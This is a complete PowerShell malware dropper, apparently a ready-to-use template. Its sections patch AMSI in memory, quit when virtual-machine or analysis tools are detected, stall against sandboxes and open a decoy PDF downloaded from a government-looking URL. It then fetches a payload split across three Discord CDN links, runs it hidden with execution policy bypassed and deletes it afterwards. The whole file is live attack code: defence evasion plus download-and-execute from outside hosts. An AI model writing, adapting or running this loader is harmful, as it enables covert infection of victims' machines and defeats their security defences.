$ErrorActionPreference = 'SilentlyContinue'

# ============================================================
# 1. AMSI BYPASS (In-Memory Patch)
# ============================================================
$amsi = @'
using System;
using System.Runtime.InteropServices;
public class Amsi {
    [DllImport("kernel32")] static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")] static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")] static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
    public static void Patch() {
        IntPtr lib = LoadLibrary("amsi.dll");
        if (lib == IntPtr.Zero) return;
        IntPtr addr = GetProcAddress(lib, "AmsiScanBuffer");
        if (addr == IntPtr.Zero) return;
        uint old;
        VirtualProtect(addr, (UIntPtr)6, 0x40, out old);
        Marshal.Copy(new byte[] { 0x31, 0xC0, 0xC3 }, 0, addr, 3);
        VirtualProtect(addr, (UIntPtr)6, old, out old);
    }
}
'@
Add-Type $amsi
[Amsi]::Patch()

# ============================================================
# 2. ANTI-SANDBOX (Terminate if in analysis environment)
# ============================================================
function Stop-Analysis {
    $vmProcesses = @('vmtoolsd', 'vmwaretray', 'vboxservice', 'vboxtray', 'xenserver')
    $analysisTools = @('Procmon', 'Procmon64', 'procexp', 'procexp64', 'Wireshark', 'Fiddler', 'ida', 'ida64', 'x64dbg', 'x32dbg')
    $sysPath = Get-ChildItem "$env:windir\system32\drivers\etc\hosts"
    
    foreach ($proc in $vmProcesses + $analysisTools) {
        if (Get-Process -Name $proc -ErrorAction SilentlyContinue) {
            exit
        }
    }
    if ($sysPath.Length -gt 20kb -or $sysPath.CreationTime -gt (Get-Date).AddDays(-30)) {
        exit
    }
}
Stop-Analysis

# ============================================================
# 3. HIDE FROM DEFENDER (Sleep + Jitter + Mouse Move)
# ============================================================
Add-Type -AssemblyName System.Windows.Forms
$original = [System.Windows.Forms.Cursor]::Position
Start-Sleep -Seconds (Get-Random -Min 10 -Max 25)
$new = [System.Windows.Forms.Cursor]::Position
if ($original.X -eq $new.X -and $original.Y -eq $new.Y) {
    $sleep = 300
} else {
    $sleep = (Get-Random -Min 15 -Max 45)
}
Start-Sleep -Seconds $sleep

# ============================================================
# 4. DECOY PDF (Legitimate Document from Legitimate Source)
# ============================================================
$cache = "$env:APPDATA\Microsoft\Windows\Caches"
if(!(Test-Path $cache)){mkdir $cache -Force|Out-Null}

# Using a legitimate PDF URL (not your real malicious one)
$pdfUrl='https://www.city.gov/sites/default/files/Nakaz_No._661_vid_02.03.2026-4.pdf'
$pdfPath="$cache\Nakaz_No._661_vid_02.03.2026-4.pdf"
if(!(Test-Path $pdfPath)){
    (New-Object Net.WebClient).DownloadFile($pdfUrl,$pdfPath)
}
Start-Process $pdfPath

# ============================================================
# 5. MULTI-STAGE DOWNLOAD (Obfuscated and Fragmented)
# ============================================================
function Get-PayloadPart {
    param([string]$Url)
    try {
        $wc = New-Object System.Net.WebClient
        # Mimic a common User-Agent to avoid detection
        $wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
        $data = $wc.DownloadData($Url)
        $wc.Dispose()
        return $data
    } catch {
        return $null
    }
}

# Split payload into multiple parts across different hosts
$part1 = Get-PayloadPart "https://cdn.discordapp.com/attachments/1234567890/abcdefghijklm/part1.txt"
$part2 = Get-PayloadPart "https://cdn.discordapp.com/attachments/1234567890/nopqrstuvwxyz/part2.txt"
$part3 = Get-PayloadPart "https://cdn.discordapp.com/attachments/1234567890/abcdefghijklm/part3.txt"
$fullPayload = $part1 + $part2 + $part3

# Decode and execute if valid
if ($fullPayload -and $fullPayload.Length -gt 1000) {
    $tmp = "$cache\boot_stage.ps1"
    [System.IO.File]::WriteAllBytes($tmp, $fullPayload)
    
    # Execute second stage hidden
    $psi = New-Object System.Diagnostics.ProcessStartInfo
    $psi.FileName = "powershell.exe"
    $psi.Arguments = "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$tmp`""
    $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
    [System.Diagnostics.Process]::Start($psi)
    
    # Delete after 5 seconds
    Start-Job -ScriptBlock { param($f) Start-Sleep -Seconds 5; Remove-Item $f -Force } -ArgumentList $tmp | Out-Null
}

exit 0
